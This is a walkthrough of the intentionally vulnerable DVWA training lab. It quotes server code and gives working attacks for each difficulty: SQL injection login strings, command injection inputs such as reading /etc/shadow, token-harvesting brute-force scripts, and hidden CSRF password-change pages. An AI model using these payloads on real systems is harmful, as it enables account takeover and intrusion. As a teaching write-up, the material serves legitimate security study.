hi guys in this repository you will see the dvwa setup and all vulnerability walkthrough :) 


disclaimer
This document is for learning and research purposes only. Please do not use the technical source code in this document for illegal purposes. Any negative impact caused by anyone has nothing to do with me.

Range project address
https://github.com/ethicalhack3r/DVWA


knowledge points
brute force
command execution
csrf
file contains
captcha bypass
sql injeciton
sql injection (blind injection)
session bypass
xss
csp bypass
js attack

============================================
lab environment

The environment is for reference only

phpstudy (you can test %00 truncation, you can also test the Phpstudy backdoor by the way)
Microsoft Windows 10 Enterprise LTSC - 10.0.17763
dvwa Version 1.10 Development (Release date: 2015-10-08)
VMware® Workstation 15 Pro - 15.0.0 build-10134415
kali 4.19.0-kali3-amd64

=============================================

build/use
windows
it is recommended to use phpstudy for quick construction

modify config.inc.php, configure database password
$_DVWA['db_password']='root';

Login Login url:http://127.0.0.1/dvwa/login.php
Account password: admin/password

difficulty

cancel login

Change file:\dvwa\include\dvwaPage.inc.php

Change method: just comment //dvwaRedirect( DVWA_WEB_PAGE_TO_ROOT.'login.php' );

Brute_Force
Brute Force, that is, brute force (cracking), means that hackers use password dictionaries to guess and solve user passwords using exhaustive methods.

Low
Server-side core code

<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Get username
	$user = $_GET[ 'username' ];

	// Get password
	$pass = $_GET[ 'password' ];
	$pass = md5( $pass );

	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>

It can be seen that the server only verifies whether the parameter Login is set
(the isset function is used in PHP to detect whether the variable is set,
and the function returns a Boolean value, that is, true/false),
without any anti-explosion mechanism, and There is no filtering for the parameters username and password,
and there is an obvious sql injection vulnerability.


exploit burpsuite

The installation process of burp is briefly

grab bag

ctrl+I Copy the package to the intruder module, because the password parameter needs to be blasted, so add $ on both sides of the content of the password parameter

Select Payloads, load the dictionary, and click Start attack to blast

Finally, try to find the correct password in the blasting results, you can see that the response packet length (length) of password is "different", it can be speculated that password is the correct password, and the manual verification login is successful.

manual sql injection

Username: admin' or '1'='1 Password: (empty), at this time the sql statement is as follows:

Username: admin' # Password: (empty), at this time, the sql statement is as follows:

Medium
Server-side core code

<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Sanitise username input
	$user = $_GET[ 'username' ];
	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitise password input
	$pass = $_GET[ 'password' ];
	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass = md5( $pass );

	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		sleep( 2 );
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>



Compared with the Low-level code, the Medium-level code mainly adds the mysql_real_escape_string function, which escapes the special symbols (x00,n,r,,',",x1a) in the string, basically able to resist SQL Injection attack, but if the encoding is set to GBK in versions below MySQL 5.5.37, the encoding can be constructed to bypass the escape of single quotes in mysql_real_escape_string (because the MySQL version in the experimental environment is relatively new, so no corresponding verification has been done); at the same time, $pass does The MD5 check is implemented, which eliminates the possibility of sql injection through the parameter password. However, there is still no effective anti-explosion mechanism (sleep (2) is not really counted).

For specific mysql_real_escape_string function bypassing problems, see

PHP prevents SQL injection from adding addslashes and mysql_real_escape_string
PHP character encoding bypass vulnerability summary
mysql_real_escape_string() versus Prepared Statements
Although sql injection is no longer effective, Burpsuite can still be used for blasting, which is basically the same as the Low level blasting method, so I won’t go into details here.

High
Server-side core code

<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Sanitise username input
	$user = $_GET[ 'username' ];
	$user = stripslashes( $user );
	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitise password input
	$pass = $_GET[ 'password' ];
	$pass = stripslashes( $pass );
	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass = md5( $pass );

	// Check database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		sleep( rand( 0, 3 ) );
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>


Token is added to the code at the High level, which can resist CSRF attacks and also increase the difficulty of blasting. Through packet capture, we can see that four parameters are submitted during login verification: username, password, Login and user_token.

Every time the login page returned by the server will contain a random user_token value, the user must submit the user_token together every time they log in. After the server receives the request, it will check the token first, and then perform the sql query.

At the same time, in the High level code, stripslashes (remove the backslash characters in the string, if there are two consecutive backslashes, only one will be removed), mysql_real_escape_string filters and escapes the parameters username and password, Further defense against sql injection.

Brute using a python script

Applicable to the old version dvwa environment


from bs4 import BeautifulSoup
import urllib2
header={
        'Host': '<改成你自己机器IP!!!>',
		'Cache-Control': 'max-age=0',
		'If-None-Match': "307-52156c6a290c0",
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
		'Accept': '*/*',
		'Referer': 'http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/index.php',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8',
		'Cookie': 'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'
        }
requrl = "http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/"

def get_token(requrl,header):
	req = urllib2.Request(url=requrl,headers=header)
	response = urllib2.urlopen(req)
	print response.getcode(),
	the_page = response.read()
	print len(the_page)
	soup = BeautifulSoup(the_page,"html.parser")
	user_token = soup.form.input.input.input.input["value"] # get the user_token
	return user_token

user_token = get_token(requrl,header)
i=0
for line in open("password.txt"):
	requrl = "http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
	i = i+1
	print i,'admin',line.strip(),
	user_token = get_token(requrl,header)
	if (i == 10):
		break
    

The function of get_token is to grab the value of user_token from the html page through Python's BeautifulSoup library. For the convenience of display, only 10 attempts are set here.

Note: In the latest version, due to hard source code modification, it is impossible to directly use BeautifulSoup to match the user_token value, here is my slightly modified version


import requests, re
from bs4 import BeautifulSoup

requrl='http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/'
header={
        'Host': '<改成你自己机器IP!!!>',
		'Cache-Control': 'max-age=0',
		'If-None-Match': "307-52156c6a290c0",
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
		'Accept': '*/*',
		'Referer': 'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8',
		'Cookie': 'security=high; PHPSESSID=vlalfd2e2rbtptnd8pqqn646g4'
        }

def get_token(requrl,header):
    req = requests.get(url=requrl,headers=header)
    page = req.text
    soup = BeautifulSoup(page,"html.parser")
    value = soup.select("input[name=user_token]")

    key=str(value)
    p1 = r"(?<=value=\").+?(?=\")"
    pattern1 = re.compile(p1)
    matcher1 = re.search(pattern1,key)

    user_token= matcher1.group(0)
    a=str(user_token)
    print (req.status_code,len(page))
    return a

user_token = get_token(requrl,header)
i=0

for key in open("password.txt"):

    requrl = "http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/"+"?username=admin&password="+key.strip()+"&Login=Login&user_token="+user_token

    i = i+1
    print (i,'admin',key.strip(), end=" " )
    user_token = get_token(requrl,header)
    if (i == 100):
        break
        
 The code is poorly written, don’t make fun of it. Actually, this matching is the most critical user_token = re.findall(r"name='user_token' value='(.+?)'",content)[0]

Note: Use urllib3's ProxyManager to allow the http request traffic generated by python to pass through burpsutie's proxy



import urllib3.request

    proxy = urllib3.ProxyManager('http://127.0.0.1:8080', headers=header)
    req = proxy.request('POST', url=requrl)
    
    
In addition, you can use the burp plug-in CSRF Token Tracker to capture tokens, please do your own research

Impossible
Server-side core code

 <?php

if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Sanitise username input
	$user = $_POST[ 'username' ];
	$user = stripslashes( $user );
	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitise password input
	$pass = $_POST[ 'password' ];
	$pass = stripslashes( $pass );
	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass = md5( $pass );

	// Default values
	$total_failed_login = 3;
	$lockout_time       = 15;
	$account_locked     = false;

	// Check the database (Check user information)
	$data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
	$data->bindParam( ':user', $user, PDO::PARAM_STR );
	$data->execute();
	$row = $data->fetch();

	// Check to see if the user has been locked out.
	if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
		// User locked out.  Note, using this method would allow for user enumeration!
		//$html .= "<pre><br />This account has been locked due to too many incorrect logins.</pre>";

		// Calculate when the user would be allowed to login again
		$last_login = strtotime( $row[ 'last_login' ] );
		$timeout    = $last_login + ($lockout_time * 60);
		$timenow    = time();

		/*
		print "The last login was: " . date ("h:i:s", $last_login) . "<br />";
		print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";
		print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";
		*/

		// Check to see if enough time has passed, if it hasn't locked the account
		if( $timenow < $timeout ) {
			$account_locked = true;
			// print "The account is locked<br />";
		}
	}

	// Check the database (if username matches the password)
	$data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
	$data->bindParam( ':user', $user, PDO::PARAM_STR);
	$data->bindParam( ':password', $pass, PDO::PARAM_STR );
	$data->execute();
	$row = $data->fetch();

	// If its a valid login...
	if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
		// Get users details
		$avatar       = $row[ 'avatar' ];
		$failed_login = $row[ 'failed_login' ];
		$last_login   = $row[ 'last_login' ];

		// Login successful
		$html .= "<p>Welcome to the password protected area <em>{$user}</em></p>";
		$html .= "<img src=\"{$avatar}\" />";

		// Had the account been locked out since last login?
		if( $failed_login >= $total_failed_login ) {
			$html .= "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
			$html .= "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
		}

		// Reset bad login count
		$data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
		$data->bindParam( ':user', $user, PDO::PARAM_STR );
		$data->execute();
	} else {
		// Login failed
		sleep( rand( 2, 4 ) );

		// Give the user some feedback
		$html .= "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";

		// Update bad login count
		$data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
		$data->bindParam( ':user', $user, PDO::PARAM_STR );
		$data->execute();
	}

	// Set the last login time
	$data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
	$data->bindParam( ':user', $user, PDO::PARAM_STR );
	$data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>


It can be seen that the Impossible level code has added a reliable anti-blasting mechanism. When frequent wrong logins are detected, the system will lock the account and the blasting will not continue.

At the same time, a more secure PDO (PHP Data Object) mechanism is adopted to defend against sql injection, because the PDO extension itself cannot be used to perform any database operations, and the key to sql injection is to execute malicious sql commands by destroying the structure of sql statements.

About PDOs

PDO of PHP study notes : - https://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html



Command_Injection
Command Injection, that is, command injection, refers to destroying the command statement structure by submitting maliciously constructed parameters, so as to achieve the purpose of executing malicious commands. PHP command injection attack vulnerability is one of the common script vulnerabilities in PHP applications. Programs such as Discuz! and DedeCMS have had this type of vulnerability.

Low
Server-side core code


<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = $_REQUEST[ 'ip' ];

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>


Related function introduction

stristr(string, search, before_search)

The stristr function searches for the first occurrence of a string in another string, returns the remainder of the string (from the matching point), or returns FALSE if the searched string is not found. The details are as follows:

===================================================================

string Required. Specifies the string to be searched.
  search Required. Specifies the string to search for. If the argument is a number, searches for characters that match the ASCII value of the number.
  before_search Optional. Defaults to a boolean of "false". If set to "true", it will return the part of the string before the first occurrence of the search parameter.
  Return Value: Returns the remainder of the string (from the matching point). Returns FALSE if the searched string is not found.
  In PHP 5.3, the before_search parameter was added.
  In PHP 4.3, this function became binary safe.
  
  ==================================================================
  
  
  php_uname(mode)

This function will return the relevant description of the operating system running php. The parameter mode can take the value "a" (this is the default, including all modes in the sequence "s n r v m"), "s " (returns the name of the operating system), "n" (returns the hostname), "r" (returns the version name), "v" (returns the version information), "m" (returns the machine type).

It can be seen that the server executes different ping commands by judging the operating system, but does not perform any filtering on the ip parameter, resulting in a serious command injection vulnerability.

exploit

Both windows and linux systems can use && to execute multiple commands

127.0.0.1 && net user

Entering 127.0.0.1 && cat /etc/shadow under Linux can even read the shadow file, which shows the great harm.

Medium
Server-side core code

<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = $_REQUEST[ 'ip' ];

	// Set blacklist
	$substitutions = array(
		'&&' => '',
		';'  => '',
	);

	// Remove any of the charactars in the array (blacklist).
	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>


It can be seen that, compared with the Low-level code, the server side filters the ip parameters to a certain extent, that is, deletes "&&" and ";", which essentially uses a blacklist mechanism, so there are still security issues.

exploit

127.0.0.1 & netuser

Because only "&&" and ";" are filtered, "&" will not be affected.

What needs to be noted here is the difference between "&&" and "&":

Command 1 && Command 2 Execute Command 1 first, execute Command 2 after successful execution, otherwise do not execute Command 2 Command 1 & Command 2 execute Command 1 first, regardless of whether it is successful or not, Command 2 will be executed

exploit 2

Since str_replace is used to replace "&&" and ";" with empty characters, it can be bypassed in the following ways:

127.0.0.1 &;& ipconfig

This is because ; in 127.0.0.1&;&ipconfig will be replaced with a null character, so that it becomes 127.0.0.1&& ipconfig and will be executed successfully.

High
Server-side core code

<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = trim($_REQUEST[ 'ip' ]);

	// Set blacklist
	$substitutions = array(
		'&'  => '',
		';'  => '',
		'| ' => '',
		'-'  => '',
		'$'  => '',
		'('  => '',
		')'  => '',
		'`'  => '',
		'||' => '',
	);

	// Remove any of the charactars in the array (blacklist).
	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>

Compared with Medium-level codes, High-level codes further improve the blacklist, but due to the limitations of the blacklist mechanism, we can still bypass it.

exploit

The blacklist seems to have filtered all illegal characters, but it is carefully observed that | (note that there is a space after the |) is replaced by a null character, so "|" becomes a "fish that slipped through the net".

127.0.0.1|net user Command 1 | Command 2

| is a pipe symbol, which means that the output of Command 1 is used as the input of Command 2, and only the result of Command 2 execution is printed.

Impossible
Server-side core code



<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$target = $_REQUEST[ 'ip' ];
	$target = stripslashes( $target );

	// Split the IP into 4 octects
	$octet = explode( ".", $target );

	// Check IF each octet is an integer
	if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
		// If all 4 octets are int's put the IP back together.
		$target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

		// Determine OS and execute the ping command.
		if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
			// Windows
			$cmd = shell_exec( 'ping  ' . $target );
		}
		else {
			// *nix
			$cmd = shell_exec( 'ping  -c 4 ' . $target );
		}

		// Feedback for the end user
		$html .= "<pre>{$cmd}</pre>";
	}
	else {
		// Ops. Let the user name theres a mistake
		$html .= '<pre>ERROR: You have entered an invalid IP.</pre>';
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>


Related function introduction

stripslashes(string)

The stripslashes function removes backslashes from the string string, returning the backslash-stripped string.

explode(separator, string, limit)

Break up the string into an array and return an array of strings. The parameter separator specifies where to split the string, the parameter string is the string to be split, and the optional parameter limit specifies the number of returned array elements.

is_numeric(string)

Checks whether string is a number or a string of numbers, and returns TRUE if it is, FALSE otherwise.

It can be seen that the code at the Impossible level has added Anti-CSRF token, and at the same time, the parameter ip is strictly restricted. Only the input such as "number.number.number.number" will be accepted and executed, so there is no command injection vulnerability .

CSRF
CSRF, the full name of Cross-site request forgery, translates as cross-site request forgery, which refers to using the victim's identity authentication information (cookie, session, etc.) Without the knowledge of the victim, send a request to the server (corresponding to the identity authentication information) to complete illegal operations (such as transfer, change encryption, etc.). The biggest difference between CSRF and XSS is that CSRF does not steal Take the cookie but use it directly. In the new version of OWASP Top 10 released in 2013, CSRF ranked 8th.

Low
Server-side core code


<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Get input
	$pass_new  = $_GET[ 'password_new' ];
	$pass_conf = $_GET[ 'password_conf' ];

	// Do the passwords match?
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update the database
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with passwords matching
		$html .= "<pre>Passwords did not match.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>


It can be seen that after the server receives the request to change the password, it will check whether the parameters password_new and password_conf are the same, if they are the same, the password will be changed, and there is no anti-CSRF mechanism (of course, the server has authenticated the sender of the request Yes, it is a cookie that is checked, but the code here does not reflect ==).

exploit

http://<IP address!!!>/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#

When the victim clicks this link, his password will be changed to password (this kind of attack is a bit clumsy, the link can be seen at a glance as a password change, and the victim will know when he sees this page after clicking the link Your password has been tampered with)

It should be noted that the most important thing about CSRF is to use the victim's cookie to send a forged request to the server, so if the victim logs in to this system with browser A before and clicks this link with browser B, the attack will not be triggered , because browser B cannot use the cookie of Chrome browser, so it will automatically jump to the login interface.

Some people will say that this link is too obvious, no one will click on it, yes, so in the real attack scenario, we need to do some processing on the link.

exploit 2

We can use short links to hide the URL (click on the short link, it will automatically jump to the real website), search for "short URL tool"

exploit 3

An attack page can be constructed. In a real attack scenario, this method needs to upload an attack page on the public network in advance, tricking the victim to visit, and it can really complete the CSRF attack without the victim's knowledge. For the convenience of demonstration, here is Write a test.html locally, the following is the specific code.



<img src="http://<IP地址!!!>/dvwa/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>

<h1>404<h1>

<h2>file not found.<h2>


Medium
Server-side core code


<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Checks to see where the request came from
	if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
		// Get input
		$pass_new  = $_GET[ 'password_new' ];
		$pass_conf = $_GET[ 'password_conf' ];

		// Do the passwords match?
		if( $pass_new == $pass_conf ) {
			// They do!
			$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			$pass_new = md5( $pass_new );

			// Update the database
			$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

			// Feedback for the user
			$html .= "<pre>Password Changed.</pre>";
		}
		else {
			// Issue with passwords matching
			$html .= "<pre>Passwords did not match.</pre>";
		}
	}
	else {
		// Didn't come from a trusted source
		$html .= "<pre>That request didn't look correct.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>


Description of related functions

int eregi(string pattern, string string)

Check if the string contains pattern (case insensitive), if yes return True, otherwise False.

stripos(string, find, start)

The stripos() function finds the first occurrence of a string within another string, case insensitive.

It can be seen that the Medium-level code checks whether the reserved variable HTTP_REFERER (the value of the Referer parameter of the http header, indicating the source address) contains SERVER_NAME (the Host parameter of the http header, and the host name to be accessed, here is the dvwa target machine IP address), hoping to resist CSRF attacks through this mechanism.

Two values in the PHP superglobal $_SERVER:

$_SERVER['HTTP_REFERER']: Obtain the url link address of the previous page linked to the current page in PHP, that is, the value of the Referer parameter in the HTTP packet.

$_SERVER['SERVER_NAME']: Obtain the name of the server host in PHP, that is, the value of the Host parameter in the HTTP packet.

exploit

The filtering rule is that the value of the Referer parameter in the http header must contain the host name (here is the IP address of the dvwa target machine)

We can name the attack page as <dvwa target machine’s IP address>.html to bypass it



High
Server-side core code

<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$pass_new  = $_GET[ 'password_new' ];
	$pass_conf = $_GET[ 'password_conf' ];

	// Do the passwords match?
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update the database
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with passwords matching
		$html .= "<pre>Passwords did not match.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>


It can be seen that the High level code has added the Anti-CSRF token mechanism. Every time the user visits the encryption page, the server will return a random token. When making a request to the server, the token parameter needs to be submitted, and the server receives the request. , the token will be checked first, and the client's request will be processed only if the token is correct.

exploit

To bypass the High-level anti-CSRF mechanism, the key is to obtain the token, and use the victim's cookie to modify the password page to obtain the key token.

Try to construct an attack page, place it on the attacker's server, and lure the victim to visit, so as to complete the CSRF attack. The following is the code.


<script type="text/javascript">
	function attack()
	{
	document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;
	document.getElementById("transfer").submit();
	}
</script>

<iframe src="http://<IP地址!!!>/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">
</iframe>

<body onload="attack()">
<form method="GET" id="transfer" action="http://<IP地址!!!>/dvwa/vulnerabilities/csrf">
	<input type="hidden" name="password_new" value="password">
	<input type="hidden" name="password_conf" value="password">
	<input type="hidden" name="user_token" value="">
	<input type="hidden" name="Change" value="Change">
</form>

</body>



The idea of the attack is that when the victim clicks to enter this page, the script will secretly access the password-changing page through an invisible framework, obtain the token in the page, and send a request to change the password to the server to complete the CSRF attack.

However, the gap between ideal and reality is huge, and cross-domain issues are involved here, and current browsers do not allow cross-domain requests. Here is a brief explanation of cross-domain, the address of our frame iframe access is http://< The dvwa target machine IP>/dvwa/vulnerabilities/csrf is located on server A, and our attack page is located on hacker server B. The domain names of the two are different. All pages under domain name B are not allowed to actively obtain pages under domain name A. content, unless the page under domain name A actively sends information to the page under domain name B, so our attack script is impossible to obtain the user_token in the encryption interface.

